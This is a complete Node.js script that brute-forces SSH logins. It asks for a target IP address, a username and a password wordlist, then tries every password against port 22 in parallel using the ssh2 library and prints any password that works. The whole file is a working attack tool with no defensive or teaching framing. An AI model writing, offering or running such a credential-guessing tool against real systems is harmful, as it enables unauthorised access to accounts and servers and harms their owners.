const readline = require('readline');
const ssh2 = require('ssh2').Client;
const fs = require('fs');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

rl.question('Please enter target IP address: ', (target) => {
    rl.question('Please enter username to bruteforce: ', (username) => {
        rl.question('Please enter location of the password file: ', (passwordFile) => {
            rl.close();

            fs.readFile(passwordFile, 'utf8', (err, data) => {
                if (err) {
                    console.error(err);
                    return;
                }

                const passwords = data.split('\n');

                for (let i = 0; i < passwords.length; i++) {
                    const password = passwords[i].trim();

                    const conn = new ssh2();
                    conn.on('ready', () => {
                        console.log(`password found: ${password}`);
                        conn.end();
                        process.exit(0);
                    });
                    conn.on('error', (err) => {
                        if (err.message === 'Authentication failed.') {
                            console.log('no luck');
                        } else {
                            console.error(err);
                        }
                        conn.end();
                    });
                    conn.connect({
                        host: target,
                        port: 22,
                        username: username,
                        password: password
                    });
                }
            });
        });
    });
});
